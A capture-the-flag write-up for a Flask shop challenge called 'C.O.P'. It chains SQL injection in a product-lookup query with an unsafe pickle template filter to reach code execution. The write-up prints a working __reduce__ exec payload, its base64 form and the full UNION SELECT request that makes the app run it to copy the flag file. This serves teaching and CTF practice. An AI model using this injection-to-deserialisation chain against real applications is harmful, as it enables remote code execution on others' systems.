---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: C.O.P

It is a simple Flask (Python) eshop-like app getting inventory from database and displays it. There are only two endpoints, displaying the whole inventory and one item.

## SQL Injection

The first think to notice is the unsafe SQL query.

```
# challenge/application/models.py
    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
```

The `product_id` is supplied as it is from the URL path. So let's test it out.

```
GET /view/666'%20OR%201=1-- HTTP/1.1
```

We'll get 200 on success and 500 on failure. The one above works like a charm. Nice.

## Strange Templating Function

Looking around, we can spot a strange function in template, that does not look like standard Jinja.

```
# challenge/application/templates/index.html
...
<div class="row gx-4 gx-lg-5 row-cols-2 row-cols-md-3 row-cols-xl-4">
	{% for product in products %}
	{% set item = product.data | pickle %}
	<div class="col mb-5">
...
```

It is actually a custom function (see https://flask.palletsprojects.com/en/2.3.x/templating/#registering-filters)

```
# challenge/application/app.py
@app.template_filter('pickle')
def pickle_loads(s):
	return pickle.loads(base64.b64decode(s))
```

So it loads a base64 string, unpickles it (python for deserialising) and processes it. Yuck! By tracking the string, we can see that it is taken from the database.

## Pickle

The pickle is nice, but very unsafe function. https://snyk.io/blog/guide-to-python-pickle/ It can be used for executing code on deserialisation.

Let's reverse the process in the app.

```
import base64, pickle

class Item:
	def __init__(self, name, description, price, image):
		self.name = name
		self.description = description
		self.image = image
		self.price = price

item = Item('Pickle Shirt', 'Get our new pickle shirt!', '23', '/static/images/pickle_shirt.jpg')

p = base64.b64encode(pickle.dumps(item)).decode()
print(p)

i = pickle.loads(base64.b64decode(p))
print(i.name)
```

Now to craft the payload, we shall define the `__reduce__` function that gets executed on deserialisation. The payload looks like follows.

```
import base64, pickle

class Attack:
    def __reduce__(self):
        #return (exec, ("import subprocess; subprocess.run('date')",))
        return (exec, ("import subprocess; subprocess.run(['cp', '/app/flag.txt', '/app/application/static/images/flag.txt'])",))

p = base64.b64encode(pickle.dumps(Attack())).decode()

print(p)
```

Note that it does not open a reverse shell, just copies the flag somewhere where it could be served by the web server. The payload is as follows:

```
gASVgQAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIxlaW1wb3J0IHN1YnByb2Nlc3M7IHN1YnByb2Nlc3MucnVuKFsnY3AnLCAnL2FwcC9mbGFnLnR4dCcsICcvYXBwL2FwcGxpY2F0aW9uL3N0YXRpYy9pbWFnZXMvZmxhZy50eHQnXSmUhZRSlC4=
```

## Putting It Together

To exploit it we force the app to retrive our payload from database though SQL injection. It then executes a code, copying the flag to retrivable location.

The SQL injection is abused to return a constant which is added to the results by UNION. In SQLite it is done as follows:

```
SELECT 'the_consant_here'
```

So, the request is like this:

```
GET /view/666'%20UNION%20SELECT%20'gASVgQAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIxlaW1wb3J0IHN1YnByb2Nlc3M7IHN1YnByb2Nlc3MucnVuKFsnY3AnLCAnL2FwcC9mbGFnLnR4dCcsICcvYXBwL2FwcGxpY2F0aW9uL3N0YXRpYy9pbWFnZXMvZmxhZy50eHQnXSmUhZRSlC4='-- HTTP/1.1
Host: 167.99.82.136:30795
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

This returns 200, indicating success.

Then simply access `http://167.99.82.136:30795/static/images/flag.txt` to receive the flag.